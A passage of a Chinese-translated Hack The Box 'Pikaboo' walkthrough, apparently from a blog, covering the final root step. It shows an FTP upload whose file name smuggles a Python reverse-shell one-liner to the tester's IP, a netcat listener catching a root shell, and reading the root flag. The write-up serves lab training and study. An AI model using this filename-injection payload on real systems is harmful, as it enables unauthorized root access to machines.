translated">请注意，第一个字符是，然后执行后面的代码。这将使用Python在Kali上为我们打开外壳。还可以看到，我不得不做了一些额外的反斜杠，以确保特殊字符得到正确处理。</p><p id="ddf3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">将命令更改为Kali tun0 IP和端口后，我们只需将它作为put命令的一部分粘贴进来。首次登录FTP:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="edba" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/pikaboo]<br/>└─# ftp pikaboo.htb<br/>Connected to pikaboo.htb.<br/>220 (vsFTPd 3.0.3)<br/>Name (pikaboo.htb:kali): pwnmeow<br/>331 Please specify the password.<br/>Password:<br/>230 Login successful.<br/>Remote system type is UNIX.<br/>Using binary mode to transfer files.</span></pre><p id="41e6" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">从根文件夹转到另一个文件夹，因为我们在那里没有权限:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="99eb" class="nc km iq my b gy nd ne l nf ng">ftp&gt; cd versions<br/>250 Directory successfully changed.</span></pre><p id="b23c" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">使用put命令，我们需要一个本地文件上传到这里，我刚刚创建了一个名为test的空白文件。然后，我们将上面的命令粘贴到末尾:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="94cd" class="nc km iq my b gy nd ne l nf ng">ftp&gt; put test "|python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("\"10.10.14.239\",1338));[os.dup2(s.fileno(),f)for\ f\ in(0,1,2)];pty.spawn(""\"sh\")';.csv"</span><span id="2933" class="nc km iq my b gy ns ne l nf ng">local: test remote: |python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("10.10.14.239",1338));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("sh")';.csv</span><span id="f85b" class="nc km iq my b gy ns ne l nf ng">200 PORT command successful. Consider using PASV.<br/>150 Ok to send data.<br/>226 Transfer complete.<br/>ftp&gt;</span></pre><p id="a03a" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">上传时，名为test的文件被重命名为我们的有效负载。现在切换到一个等待中的Netcat监听器，看看我们有一个反向shell作为root连接:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="6746" class="nc km iq my b gy nd ne l nf ng">┌──(root💀kali)-[~/htb/pikaboo]<br/>└─# nc -lvvp 1338<br/>listening on [any] 1338 ...<br/>connect to [10.10.14.239] from pikaboo.htb [10.10.10.249] 52370<br/># id<br/>id<br/>uid=0(root) gid=0(root) groups=0(root)</span></pre><p id="d595" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">你必须等待脚本运行，这是每分钟，所以不会花很长时间。现在我们终于可以得到根标志了:</p><pre class="lk ll lm ln gt mx my mz na aw nb bi"><span id="f079" class="nc km iq my b gy nd ne l nf ng"># ls /root<br/>root.txt  vsftpd.log<br/><br/># cat /root/root.txt<br/>&lt;HIDDEN&gt;</span></pre><p id="0fe8" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">对我来说，这真的是一个很难的盒子，但从中吸取一些有益的教训是非常值得的。</p><p id="befe" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">完成了。下次见。</p></div><div class="ab cl nt nu hu nv" role="separator"><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny nz"/><span class="nw bw bk nx ny"/></div><div class="ij ik il im in"><p id="2533" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">如果你喜欢这篇文章，请给我一两个掌声。</p><p id="071d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">推特—<a class="ae nk" href="https://twitter.com/pencer_io" rel="noopener ugc nofollow" target="_blank">https://twitter.com/pencer_io</a><br/>网站— <a class="ae nk" href="https://pencer.io/" rel="noopener ugc nofollow" target="_blank"> https://pencer.io </a></p><p id="5eba" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="oa">原载于2021年12月3日</em><a class="ae nk" href="https://pencer.io/ctf/ctf-htb-pikaboo/" rel="noopener ugc nofollow" target="_blank"><em class="oa">https://pencer . io</em></a><em class="oa">。</em></p></div></div>    
</body>
</html>